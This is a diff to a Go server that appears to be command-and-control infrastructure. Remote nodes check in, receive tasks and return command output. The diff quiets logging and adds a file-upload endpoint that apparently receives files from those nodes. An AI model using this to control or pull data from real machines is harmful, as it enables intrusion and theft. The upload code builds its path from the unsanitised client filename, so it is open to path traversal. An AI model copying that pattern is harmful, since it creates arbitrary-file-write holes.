@@ -64,6 +64,7 @@ func handleRequests() {
 	http.HandleFunc("/get_nodes", get_nodes)
 	http.HandleFunc("/get_tasks", get_tasks)
 	http.HandleFunc("/download/", downloadHandler)
+	http.HandleFunc("/upload", uploadHandler)
 	// http.HandleFunc("/getPayload", getPayload)
 
 	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
@@ -205,26 +206,26 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 		update_node(node_that_checked_in.ID, dt.String())
 
-		fmt.Println("Node re-checked in")
+		// fmt.Println("Node re-checked in")
 	}
 
-	// Output something pretty
-	fmt.Println()
-	fmt.Println("============= New Check in =============")
+	// // Output something pretty
+	// fmt.Println()
+	// fmt.Println("============= New Check in =============")
 
-	fmt.Println("ID: " + node_that_checked_in.ID)
-	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
-	fmt.Println("Platform: " + node_that_checked_in.Platform)
-	fmt.Println("Time: " + dt.String())
+	// fmt.Println("ID: " + node_that_checked_in.ID)
+	// fmt.Println("Hostname: " + node_that_checked_in.Hostname)
+	// fmt.Println("Platform: " + node_that_checked_in.Platform)
+	// fmt.Println("Time: " + dt.String())
 
-	fmt.Println("============= ----------- =============")
+	// fmt.Println("============= ----------- =============")
 
 	// Find that nodes task
 	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)
 
 	// This handles sending back a blank response if no task is found
 	if find_task_message != "" {
-		fmt.Println("No task for node")
+		// fmt.Println("No task for node")
 
 		// Send the blank response back
 		fmt.Fprintf(w, blank_response)
@@ -248,7 +249,7 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 // Handles when a node sends back the result of a task (Command output)
 func node_response(w http.ResponseWriter, req *http.Request) {
 
-	fmt.Println("A TASK HAS BEEN COMPLETED!!!!!s")
+	fmt.Println("Node has sent response!")
 
 	fmt.Println(req.Body)
 
@@ -291,7 +292,7 @@ func node_response(w http.ResponseWriter, req *http.Request) {
 	// add the result to the task array
 	task_queue[task_location].Result = response_to_task.Result
 
-	fmt.Println("NODE RESPONSE RECORDED!")
+	// fmt.Println("NODE RESPONSE RECORDED!")
 
 	fmt.Println(task_queue[task_location])
 
@@ -322,6 +323,44 @@ func nodeSendFile(w http.ResponseWriter, req *http.Request) {
 	// Sending the reponse
 	fmt.Fprintf(w, string(response))
 
+}
+
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+	// Parse the multipart form
+	err := r.ParseMultipartForm(32 << 20) // 32 MB limit
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// Get the file from the form
+	file, handler, err := r.FormFile("file")
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+
+	// Create a new file on the server with the same name as the uploaded file
+	filepath := "./uploads/" + handler.Filename
+	f, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE, 0666)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+
+	// Write the file to disk
+	_, err = io.Copy(f, file)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	// Return a success message
+	fmt.Fprintf(w, "File uploaded successfully: %s", handler.Filename)
+
+	fmt.Println("File uploaded to path:", filepath)
 }
 
 func downloadHandler(w http.ResponseWriter, r *http.Request) {
